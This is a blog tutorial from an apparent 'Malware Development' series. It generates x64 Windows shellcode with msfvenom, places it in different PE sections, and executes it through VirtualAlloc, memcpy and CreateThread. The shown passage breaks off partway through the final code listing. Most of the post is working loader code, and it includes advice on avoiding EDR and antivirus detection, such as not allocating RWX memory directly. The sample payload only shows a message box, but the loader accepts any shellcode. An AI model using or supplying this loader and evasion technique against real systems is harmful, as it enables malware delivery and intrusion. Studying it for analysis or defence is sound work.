# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <p>Note: The information I will be sharing is for pure learning purpose, DO NOT USE IT IN ANY ILLEGAL ACTIONS, let us pause and consider the profound impact we can have by channeling our expertise towards POSITIVE ENDS.</p>

<h1 id="payload-generation">Payload generation<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#payload-generation" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<h2 id="what-is-a-payload">What is a payload?<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#what-is-a-payload" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>A payload is some kind of malicious code or instructions that we want to execute, most of Malware authors design their payload that’ll achieve thier ultimate goal (gaining access, encrypting some data, exfiltration, etc.) and then obfuscate it in a way that makes it less or undetectable by the EDRs or AntiViruses, so the first step of every Malware Development process is to craft your payload.</p>

<h2 id="shellcode-and-msvenom">Shellcode and MSVENOM<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#shellcode-and-msvenom" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>A very popular tool to craft Windows payloads or (Shellcode) is <mark>msvenom</mark>, we can generate an example payload that will just run a messagebox:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -a x64 --platform windows -p windows/messagebox TEXT="CRAFTING DIGITAL CHAOS" -f c
</code></pre></div></div>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-0.png" alt="P1"></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
<span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4c\x8d\x85\x15\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\x43\x52\x41\x46\x54\x49\x4e\x47\x20\x44\x49\x47\x49</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x54\x41\x4c\x20\x43\x48\x41\x4f\x53\x00\x4d\x65\x73\x73</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x61\x67\x65\x42\x6f\x78\x00</span><span class="s">"</span><span class="p">;</span>
</code></pre></div></div>

<p>This payload or shellcode (whatever you call it) is a set of instructions and if executed will be calling a messagebox with the message we specified to msvenom, now we have our bullet, and we need to start on the GUN that’ll hold and deliver this bullet!</p>

<h1 id="storing-payload">Storing payload<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#storing-payload" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>As we know, every PE file has sections, each sections hold a specific type of data, we can control where will our payload be located, next I will explain how we can place the payload in different sections and what is the benifit of each way.</p>

<h2 id="text-section">.text section<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#text-section" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Placing the payload inside the text section means that it is in an executable region by default, as .text section holds the code of the PE file, so your payload will be eventually a part of the code itself, however that section should not by default be writeable, only executable .text section is normal, Modifying the payload by any how during execution will make the section writeable and hence throwing an alert which is something we don’t want.</p>

<p>example of normal .text section’s permission:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-1.png" alt="P2"></p>

<p>Code:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma section(".text")
</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">allocate</span><span class="p">(</span><span class="s">".text"</span><span class="p">))</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x4c\x8d\x85\x15\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd5\x43\x52\x41\x46\x54\x49\x4e\x47\x20\x44\x49\x47\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x54\x41\x4c\x20\x43\x48\x41\x4f\x53\x00\x4d\x65\x73\x73</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61\x67\x65\x42\x6f\x78\x00</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[i] Address of buf is %p"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We start by specifying to the compiler that the following code should be placed inside .text section by using <strong>“#pragma section(“.text”)”</strong> then appending our payload in the space that’ll be allocated inside .text section, here <strong>declspec</strong> is used to change some attributes of our variable buf.</p>

<p>To validate this will be placed inside ,text section we can make a breakpoint on the return statement in main function, then we can take the address of the buf variable and check it in memory:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-2.png" alt="P3">
<img src="https://ry0dan.github.io/assets/images/malware-development/2-3.png" alt="P4"></p>

<p>To confirm that this address is indeed inside .text section we can do it in a simple way:</p>

<p>first before the return of main function add:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">getchar</span><span class="p">();</span>
</code></pre></div></div>
<p>We are adding this statement so that the application is waiting for our input and doesn’t exit immediately, next run the application and go to x64dbg and attach it to be debugged.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-4.png" alt="P5"></p>

<p>Take the address the program has outputted and go to memory map on x64dbg.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-5.png" alt="P6">
<img src="https://ry0dan.github.io/assets/images/malware-development/2-6.png" alt="P7"></p>

<p>The payload is at <strong>00007FF649B417B8</strong> and this is indeed an address within the adress space of .text section.</p>

<h2 id="data-section">.data section<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#data-section" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>The .data section mainly contains the initialize variables whether it is global or local, and it has both write and read permissions, but it is not executable by default.</p>

<p>We can use the following code to place our payload inside .data variable:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
    <span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x4c\x8d\x85\x15\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd5\x43\x52\x41\x46\x54\x49\x4e\x47\x20\x44\x49\x47\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x54\x41\x4c\x20\x43\x48\x41\x4f\x53\x00\x4d\x65\x73\x73</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61\x67\x65\x42\x6f\x78\x00</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[i] Address of buf is %p"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
  <span class="n">getchar</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And check the same way we did before:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-7.png" alt="P8"></p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-8.png" alt="P9"></p>

<h2 id="rdata-section">.rdata section<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#rdata-section" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>This section stands for “read-only data”, and as you can tell from the name, This section only has read permissions, and the only difference we add to the code above in order to store the buf variable in .rdata section is to make it a constant or static variable, this happens when you add <code class="language-plaintext highlighter-rouge">const</code> to the declaration.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-9.png" alt="P10"></p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/2-10.png" alt="P11"></p>

<h2 id="rsrc-section">.rsrc section<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#rsrc-section" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>I prefer to write a different post on this one :)</p>

<h1 id="payload-execution">Payload Execution<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#payload-execution" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Here comes the fun part! in order to be able to execute our payload, we need to follow this process:</p>

<ol>
  <li>Allocate memory</li>
  <li>copy our payload to that allocated space</li>
  <li>change its permissions to executable permissions (if not)</li>
  <li>Launch the payload</li>
</ol>

<h2 id="allocating-memory">Allocating memory<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#allocating-memory" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>We will be using <strong>VirtualAlloc</strong> API to do this, based on MSDN documentation, this is VirtualAlloc’s syntax:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">VirtualAlloc</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>
</code></pre></div></div>

<p>If the function succeeds, the return value is the base address of the allocated region of pages.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">dwSizeofBuf</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

<span class="n">PVOID</span> <span class="n">pAddress</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">dwSizeofBuf</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="n">pAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
<span class="p">};</span>
</code></pre></div></div>

<p>First we calculate the size of the payload or buf variable, then we allocate a memory with that size as a second parameter, and the last parameter is <strong>PAGE_EXECUTE_READWRITE</strong> that gives the allocated region the permissions of READ and WRITE and EXECUTE.</p>

<p>This is just a basic example of how to execute a shellcode but in real world engagements that’s a stupid thing to do, allocating a memory directly with PAGE_EXECUTE_READWRITE permissions is a <strong>big big red flag</strong>.</p>

<p>Instead, we can allocate with PAGE_READWRITE permissions then using <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a> to change the protection prior to execution.</p>

<p>Anyway now we have our allocated region ready, next we need to copy our payload inside that region.</p>

<h2 id="copying-the-shellcode">Copying the shellcode<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#copying-the-shellcode" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">pAddress</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">dwSizeofBuf</span><span class="p">);</span>
</code></pre></div></div>

<p>We simply used <mark>memcpy</mark> function with the Dest as first parameter then Src then the size of Src.</p>

<h2 id="executing-the-payload">Executing the payload<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-02/#executing-the-payload" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>The last step is executing our shellcode after we have copied it to an executable region, we can use <strong>CreateThread</strong> API call:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">CreateThread</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>
<span class="p">);</span>
</code></pre></div></div>
<p>A Thread refers to a sequence of instructions that can be executed independently of other sequences of instructions within the same program. Threads are the smallest unit of execution that can be scheduled by an operating system’s scheduler.</p>

<p>For now we are not interested in any parameter other than the <strong>lpStartAddress</strong> because it is the address of our shellcode.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"CreateThread failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p><small>GetLastError() is used for pure debugging purposes, it returns the error code if any error happened, we can then grep the error code and search it on MSDN to specifically know what issue are we facing.</small></p>

<p>The complete code:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
    <span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x4c\x8d\x85\x15\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd5\x43\x52\x41\x46\x54\x49\x4e\x47\x20\x44\x49\x47\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x54\x41\x4c\x20\x43\x48\x41\x4f\x53\x00\x4d\x65\x73\x73</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61\x67\x65\x42\x6f\x78\x00</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

  <span class="n">DWORD</span> <span class="n">dwSizeofBuf</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

  <span class="n">PVOID</span> <span class="n">pAddress</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">dwSizeofBuf</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
  
  <span class="k">if</span><span class="p">(</span><span class="n">pAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
  <span class="p">};</span>

